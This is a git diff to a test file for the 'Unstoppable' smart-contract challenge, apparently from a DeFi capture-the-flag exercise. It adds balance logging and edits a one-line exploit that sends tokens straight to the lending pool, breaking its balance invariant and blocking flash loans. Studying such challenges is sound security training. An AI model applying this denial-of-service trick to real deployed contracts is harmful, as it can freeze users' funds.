@@ -27,10 +27,12 @@ describe('[Challenge] Unstoppable', function () {
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.equal(TOKENS_IN_POOL);
+        console.log(await this.token.balanceOf(this.pool.address));
 
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
+        console.log(await this.token.balanceOf(attacker.address));
 
          // Show it's possible for someUser to take out a flash loan
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
@@ -40,7 +42,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.token.connect(attacker).transfer(this.pool.address,'5')
+        await this.token.connect(attacker).transfer(this.pool.address,"5")
     });
 
     after(async function () {
